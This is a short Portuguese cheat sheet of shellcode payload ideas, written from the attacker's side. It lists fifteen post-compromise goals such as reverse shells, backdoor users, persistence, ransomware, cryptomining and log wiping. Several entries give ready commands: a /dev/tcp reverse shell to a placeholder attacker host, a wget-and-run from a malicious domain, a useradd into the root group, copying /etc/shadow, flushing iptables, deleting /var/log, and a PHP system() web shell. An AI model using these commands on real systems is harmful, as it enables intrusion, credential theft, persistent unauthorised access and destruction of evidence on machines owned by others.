# O que colocar no shellcode? 🎯

## 1. **Shell Reverso / Bind Shell**
- **O quê:** Conecta de volta ao atacante ou abre porta para conexão
- **Para que:** Acesso remoto ao sistema comprometido
- **Exemplo:** `/bin/sh -i >& /dev/tcp/ATACANTE/PORTA 0>&1`

## 2. **Download & Execute**
- **O quê:** Baixa arquivo da internet e executa
- **Para que:** Estágio secundário, atualizar payload
- **Exemplo:** `wget http://malicioso.com/payload; chmod +x payload; ./payload`

## 3. **Add User / Backdoor**
- **O quê:** Cria novo usuário com privilégios
- **Para que:** Acesso persistente mesmo se vulnerabilidade for corrigida
- **Exemplo:** `useradd -m -s /bin/bash -g root hacker; echo "hacker:senha123" | chpasswd`

## 4. **Privilege Escalation**
- **O quê:** Explora vulnerabilidade local para virar root/admin
- **Para que:** Ganhar controle total do sistema
- **Exemplo:** Explora CVE conhecido, abusa de sudo misconfigurado

## 5. **File Manipulation**
- **O quê:** Lê, escreve, exclui ou modifica arquivos
- **Para que:** Roubo de dados, destruição, instalação de backdoor
- **Exemplo:** `cat /etc/shadow > /tmp/roubado.txt` (rouba hashes de senha)

## 6. **Persistence Mechanism**
- **O quê:** Configura inicialização automática
- **Para que:** Sobreviver a reinicializações
- **Exemplo:** Adiciona entrada em crontab, .bashrc, systemd, registro do Windows

## 7. **Disable Security**
- **O quê:** Desliga firewall, antivírus, logging
- **Para que:** Facilitar atividades futuras
- **Exemplo:** `systemctl stop firewalld; iptables -F`

## 8. **Lateral Movement**
- **O quê:** Propaga para outras máquinas na rede
- **Para que:** Expandir controle na rede
- **Exemplo:** Usa credenciais roubadas para conectar a outros servidores

## 9. **Keylogger / Screenshot**
- **O quê:** Captura teclas digitadas ou tela
- **Para que:** Espionagem, roubo de credenciais
- **Exemplo:** Grava tudo que usuário digita e envia para atacante

## 10. **Cryptominer**
- **O quê:** Minera criptomoeda usando recursos da vítima
- **Para que:** Ganho financeiro direto
- **Exemplo:** Executa XMRig em segundo plano

## 11. **Ransomware Component**
- **O quê:** Criptografa arquivos da vítima
- **Para que:** Extorsão por resgate
- **Exemplo:** Percorre diretórios criptografando .jpg, .doc, .pdf

## 12. **Info Stealer**
- **O quê:** Coleta informações sensíveis
- **Para que:** Roubo de dados, intelligence
- **Exemplo:** Procura por arquivos com "senha", "password", "credential"

## 13. **Cleanup / Anti-Forensics**
- **O quê:** Apaga logs, esconde rastros
- **Para que:** Dificultar investigação
- **Exemplo:** `rm -rf /var/log/*; history -c`

## 14. **Meterpreter / C2 Agent**
- **O quê:** Conecta a servidor de comando e controle
- **Para que:** Controle remoto avançado
- **Exemplo:** Payload do Metasploit que permite mais de 100 comandos

## 15. **Web Shell**
- **O quê:** Script PHP/ASP que executa comandos via web
- **Para que:** Acesso através de navegador
- **Exemplo:** `<?php system($_GET['cmd']); ?>` em servidor web comprometido

---

**Dica:** Shellcode é como uma **caixa de ferramentas** - escolha as ferramentas certas para o trabalho. Muitos ataques começam simples (shell reverso) e depois expandem funcionalidades. 🔧